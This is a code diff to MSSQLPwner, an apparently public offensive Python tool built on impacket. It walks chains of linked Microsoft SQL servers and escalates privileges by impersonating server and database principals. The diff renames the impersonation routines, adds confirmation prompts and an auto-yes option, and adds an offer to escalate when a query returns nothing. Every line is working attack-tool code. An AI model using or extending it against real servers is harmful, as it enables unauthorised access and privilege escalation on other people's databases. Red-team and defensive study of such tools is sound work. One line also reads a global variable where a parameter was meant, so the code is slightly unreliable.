@@ -23,6 +23,8 @@ from base_sql_client import BaseSQLClient
 from impacket.examples.utils import parse_target
 
 
+# TODO: Add cross-impersonation within the linked server execution chain
+
 class MSSQLPwner(BaseSQLClient):
     def __init__(self, server_address, username, args_options):
         super().__init__(server_address, args_options)
@@ -39,15 +41,16 @@ class MSSQLPwner(BaseSQLClient):
         self.debug = args_options.debug
         self.state_filename = f"{server_address}_{username}.state"
         self.state = {
-            "linkable_servers": dict(), "impersonation_users": dict(), "authentication_users": dict(),
-            "impersonation_history": dict(), "authentication_history": dict(),
+            "linkable_servers": dict(), "server_principals": dict(), "database_principals": dict(),
+            "server_principals_history": dict(), "database_principals_history": dict(),
             "adsi_provider_servers": dict(), "hostname": "", "chain_ids": dict()
         }
         self.rev2self = dict()
         self.max_recursive_links = args_options.max_recursive_links
         self.execute_as = ""
         self.current_chain_id = 1
-        self.chain_id = None
+        self.chain_id = options.chain_id
+        self.auto_yes = options.auto_yes
 
     def is_valid_chain_id(self) -> bool:
         """
@@ -63,13 +66,6 @@ class MSSQLPwner(BaseSQLClient):
                 return False
             LOG.info(f"Chosen chain: {chain_str} (ID: {str(self.chain_id)})")
         return True
-
-    def define_chain_id(self, chain_id: int) -> None:
-        """
-            This function is responsible to define the chain id.
-        """
-        LOG.info(f"Defining chain id to {chain_id}")
-        self.chain_id = chain_id
 
     def retrieve_link_server_from_chain_id(self, chain_id: int) -> str:
         """
@@ -112,24 +108,31 @@ class MSSQLPwner(BaseSQLClient):
             self.state['linkable_servers'][linkable_chain_str] = state + [linkable_server]
             self.state['chain_ids'][str(self.current_chain_id)] = linkable_chain_str
             self.current_chain_id += 1
-            if linkable_server == self.state['hostname'] or linkable_server in state\
+            if linkable_server == self.state['hostname'] or linkable_server in state \
                     or len(state) >= self.max_recursive_links:
                 continue
             self.retrieve_links(linkable_chain_str, self.state['linkable_servers'][linkable_chain_str])
 
     def direct_query(self, query: str, linked_server: str, method: Literal['OpenQuery', 'exec_at'] = "OpenQuery",
-                     decode_results: bool = True, print_results: bool = False) -> None:
+                     decode_results: bool = True, print_results: bool = False) -> bool:
         """
             This function is responsible to execute a query directly.
         """
         results = self.build_chain(query, linked_server, method, decode_results, print_results)
         if not results['is_success']:
             LOG.error(f"Failed to execute query: {query}")
-            return
+            return False
+
+        if not results['results']:
+            if self.can_impersonate(linked_server):
+                if utilities.receive_answer("No results were returned. try to escalate privileges?", ['y', 'n'], 'y'):
+                    return False
 
         for result in results['results']:
             for key, value in result.items():
                 LOG.info(f"Result: (Key: {key}) {value}")
+
+        return True
 
     def build_query_chain(self, flow, query: str, method: Literal["exec_at", "OpenQuery", "blind_OpenQuery"]):
         """
@@ -178,37 +181,49 @@ class MSSQLPwner(BaseSQLClient):
 
         return self.custom_sql_query(query, print_results=print_results, decode_results=decode_results, wait=wait)
 
-    def get_impersonation_users(self, linked_server: str) -> None:
+    def get_granted_server_principals(self, linked_server: str) -> None:
         """
-        This function is responsible to retrieve all the impersonation users recursively.
+        This function is responsible to retrieve all the server impersonation users recursively.
         """
-        rows = self.build_chain(Queries.CAN_IMPERSONATE_AS, linked_server)
+        rows = self.build_chain(Queries.CAN_IMPERSONATE_AS_SERVER_PRINCIPAL, linked_server)
         if not rows['is_success']:
-            LOG.warning(f"Failed to retrieve impersonation user list from {linked_server}")
+            LOG.warning(f"Failed to retrieve server principals user list from {linked_server}")
             return
 
-        if linked_server not in self.state['impersonation_users'].keys():
-            self.state['impersonation_users'][linked_server] = set()
+        if linked_server not in self.state['server_principals'].keys():
+            self.state['server_principals'][linked_server] = set()
 
         for row in rows['results']:
-            self.state['impersonation_users'][linked_server].add(row['name'])
-            LOG.info(f"Can impersonate as {row['name']} on {linked_server} chain")
+            self.state['server_principals'][linked_server].add(row['username'])
+            LOG.info(f"Can impersonate as {row['username']} server principal on {linked_server} chain")
 
-    def get_authentication_users(self, linked_server: str) -> None:
+    def get_granted_database_principals(self, linked_server: str) -> None:
         """
-        This function is responsible to retrieve all the users that we can authenticate with, recursively.
+        This function is responsible to retrieve all the database impersonation users recursively.
         """
-        rows = self.build_chain(Queries.USER_CONTEXT, linked_server)
+        rows = self.build_chain(Queries.CAN_IMPERSONATE_AS_DATABASE_PRINCIPAL, linked_server)
         if not rows['is_success']:
-            LOG.warning(f"Failed to retrieve authentication user list from {linked_server}")
+            LOG.warning(f"Failed to retrieve database principals user list from {linked_server}")
             return
 
-        if linked_server not in self.state['authentication_users'].keys():
-            self.state['authentication_users'][linked_server] = set()
+        if linked_server not in self.state['database_principals'].keys():
+            self.state['database_principals'][linked_server] = set()
 
         for row in rows['results']:
-            self.state['authentication_users'][linked_server].add(row['username'])
-            LOG.info(f"Can authenticate as {row['username']} on {linked_server} chain")
+            self.state['database_principals'][linked_server].add(row['username'])
+            LOG.info(f"Can impersonate as {row['username']} database principal on {linked_server} chain")
+
+    def can_impersonate(self, linked_server: str) -> bool:
+        """
+        This function is responsible to check if we can impersonate as other users.
+        """
+        if linked_server in self.state['database_principals'].keys():
+            if self.state['database_principals'][linked_server]:
+                return True
+        if linked_server in self.state['server_principals'].keys():
+            if self.state['server_principals'][linked_server]:
+                return True
+        return False
 
     def retrieve_hostname(self) -> bool:
         """
@@ -228,7 +243,8 @@ class MSSQLPwner(BaseSQLClient):
         """
         if os.path.exists(self.state_filename):
             if self.use_state:
-                if input("State file already exists, do you want to use it? (y/n): ").lower() == 'y':
+                if self.auto_yes or utilities.receive_answer("State file already exists, do you want to use it?",
+                                                             ["y", "n"], 'y'):
                     self.state = json.load(open(self.state_filename))
                     utilities.print_state(self.state)
                     if not self.is_valid_chain_id():
@@ -245,8 +261,8 @@ class MSSQLPwner(BaseSQLClient):
             LOG.info(f"\t{chain} (ID: {chain_id})")
 
         for linked_server in list(self.state['linkable_servers'].keys()) + [self.state['hostname']]:
-            self.get_impersonation_users(linked_server)
-            self.get_authentication_users(linked_server)
+            self.get_granted_server_principals(linked_server)
+            self.get_granted_database_principals(linked_server)
         utilities.store_state(self.state_filename, self.state)
         if not self.is_valid_chain_id():
             return False
@@ -269,7 +285,8 @@ class MSSQLPwner(BaseSQLClient):
             return False
 
         if is_procedure_enabled['results'][-1]['procedure'] != str(required_status):
-            LOG.warning(f"{procedure} need to be changed (Resulted status: {is_procedure_enabled['results'][-1]['procedure']})")
+            LOG.warning(
+                f"{procedure} need to be changed (Resulted status: {is_procedure_enabled['results'][-1]['procedure']})")
             is_procedure_can_be_configured = self.build_chain(Queries.IS_UPDATE_SP_CONFIGURE_ALLOWED, linked_server)
             if (not is_procedure_can_be_configured['is_success']) or \
                     is_procedure_can_be_configured['results'][0]['CanChangeConfiguration'] == 'False':
@@ -397,7 +414,6 @@ class MSSQLPwner(BaseSQLClient):
         """
 
         if not self.add_new_custom_asm(asm_file_location, linked_server, "FuncAsm"):
-
             return False
 
         add_function = self.build_chain(Queries.CREATE_FUNCTION.format(
@@ -418,54 +434,65 @@ class MSSQLPwner(BaseSQLClient):
             return False
         return True
 
-    def impersonate_as(self, linked_server: str) -> bool:
+    def impersonate_as_server_principal(self, linked_server: str) -> bool:
         """
-        This function is responsible to impersonate as a user.
+        This function is responsible to impersonate as a server principal.
         """
         self.execute_as = ""
-        if linked_server not in self.state['impersonation_users'].keys():
+        if linked_server not in self.state['server_principals'].keys():
             return False
 
-        if linked_server not in self.state['impersonation_history'].keys():
-            self.state['impersonation_history'][linked_server] = set()
+        if linked_server not in self.state['server_principals_history'].keys():
+            self.state['server_principals_history'][linked_server] = set()
 
-        for user in self.state['impersonation_users'][linked_server]:
-            if user in self.state['impersonation_history'][linked_server]:
+        for user in self.state['server_principals'][linked_server]:
+            if user in self.state['server_principals_history'][linked_server]:
                 continue
 
-            LOG.info(f"Trying to impersonate as {user} on {linked_server}")
-            # Log the impersonated in order to avoid infinite loop
-            self.state['impersonation_history'][linked_server].add(user)
-            if self.build_chain(Queries.IMPERSONATE_AS_USER.format(username=user), linked_server,
-                                method="exec_at")['is_success']:
-                LOG.info(f"Successfully impersonated as {user} on {linked_server}")
-                self.execute_as = Queries.IMPERSONATE_AS_USER.format(username=user)
-                return True
+            if not self.auto_yes:
+                if utilities.receive_answer(f"Can i attempt to impersonate as {user} server principal on {linked_server}?",
+                                            ["y", "n"], 'n'):
+                    LOG.info(f"Skipping impersonation as {user} server principal on {linked_server}")
+                    continue
 
+            LOG.info(f"Trying to impersonate as {user} server principal on {linked_server}")
+            # Log the server principal in order to avoid infinite loop
+            self.state['server_principals_history'][linked_server].add(user)
+            if self.build_chain(Queries.IMPERSONATE_AS_SERVER_PRINCIPAL.format(username=user), linked_server,
+                                method="exec_at")['is_success']:
+                LOG.info(f"Successfully impersonated as {user} server principal on {linked_server}")
+                self.execute_as = Queries.IMPERSONATE_AS_SERVER_PRINCIPAL.format(username=user)
+                return True
         return False
 
-    def authenticate_as(self, linked_server: str) -> bool:
+    def impersonate_as_database_principal(self, linked_server: str) -> bool:
         """
-        This function is responsible to authenticate as a user.
+        This function is responsible to impersonate as a database principal.
         """
         self.execute_as = ""
-        if linked_server not in self.state['authentication_users'].keys():
+        if linked_server not in self.state['database_principals'].keys():
             return False
 
-        if linked_server not in self.state['authentication_history'].keys():
-            self.state['authentication_history'][linked_server] = set()
+        if linked_server not in self.state['database_principals_history'].keys():
+            self.state['database_principals_history'][linked_server] = set()
 
-        for user in self.state['authentication_users'][linked_server]:
-            if user in self.state['authentication_history'][linked_server] or user == 'guest':
+        for user in self.state['database_principals'][linked_server]:
+            if user in self.state['database_principals_history'][linked_server] or user == 'guest':
                 continue
+            if not self.auto_yes:
+                if utilities.receive_answer(f"Can i attempt to impersonate as "
+                                            f"{user} database principal on {linked_server}?",
+                                            ["y", "n"], 'n'):
+                    LOG.info(f"Skipping impersonation as {user} database principal on {linked_server}")
+                    continue
 
-            # Log the authenticated user in order to avoid infinite loop
-            self.state['authentication_history'][linked_server].add(user)
-            LOG.info(f"Trying to authenticate as {user} on {linked_server}")
-            if self.build_chain(Queries.AUTHENTICATE_AS_USER.format(username=user), linked_server,
+            # Log the database principal user in order to avoid infinite loop
+            self.state['database_principals_history'][linked_server].add(user)
+            LOG.info(f"Trying to impersonate as {user} database principal on {linked_server}")
+            if self.build_chain(Queries.IMPERSONATE_AS_DATABASE_PRINCIPAL.format(username=user), linked_server,
                                 method="exec_at")['is_success']:
-                LOG.info(f"Successfully authenticated as {user} on {linked_server}")
-                self.execute_as = Queries.AUTHENTICATE_AS_USER.format(username=user)
+                LOG.info(f"Successfully impersonated as {user} database principal on {linked_server}")
+                self.execute_as = Queries.IMPERSONATE_AS_DATABASE_PRINCIPAL.format(username=user)
                 return True
 
         return False
@@ -514,19 +541,26 @@ class MSSQLPwner(BaseSQLClient):
         This function is responsible to attempt to run a procedure through local or link server.
         This function will try  to run the procedure through the following methods if no success:
         1. Execute the procedure locally.
-        2. Impersonate as a user and execute the procedure.
-        3. Authenticate as a user and execute the procedure.
+        2. Impersonate as a server principal and execute the procedure.
+        3. Impersonate as a database principal and execute the procedure.
 
         """
         self.execute_as = ""
-        if func(*args, **{"linked_server": linked_server}):
-            return True
-
-        while self.impersonate_as(linked_server):
+        if self.can_impersonate(linked_server):
+            if self.auto_yes or utilities.receive_answer(f"The {linked_server} server can escalate privileges, "
+                                                         f"do you want to continue with the current privileges?",
+                                                         ['y', 'n'], 'y'):
+                if func(*args, **{"linked_server": linked_server}):
+                    return True
+        else:
             if func(*args, **{"linked_server": linked_server}):
                 return True
 
-        while self.authenticate_as(linked_server):
+        while self.impersonate_as_server_principal(linked_server):
+            if func(*args, **{"linked_server": linked_server}):
+                return True
+
+        while self.impersonate_as_database_principal(linked_server):
             if func(*args, **{"linked_server": linked_server}):
                 return True
 
@@ -576,8 +610,6 @@ class MSSQLPwner(BaseSQLClient):
                                             linked_server=linked_server):
                 time.sleep(1)
                 client = MSSQLPwner(self.server_address, self.username, self.options)
-                if self.chain_id:
-                    client.define_chain_id(self.chain_id)
 
                 client.options.debug = False
                 LOG.setLevel(logging.ERROR)
@@ -632,8 +664,6 @@ if __name__ == '__main__':
     if options.aesKey is not None:
         options.k = True
     mssql_client = MSSQLPwner(address, username, options)
-    if options.chain_id:
-        mssql_client.define_chain_id(options.chain_id)
     if not mssql_client.connect(username, password, domain):
         sys.exit(1)
     if not mssql_client.enumerate():
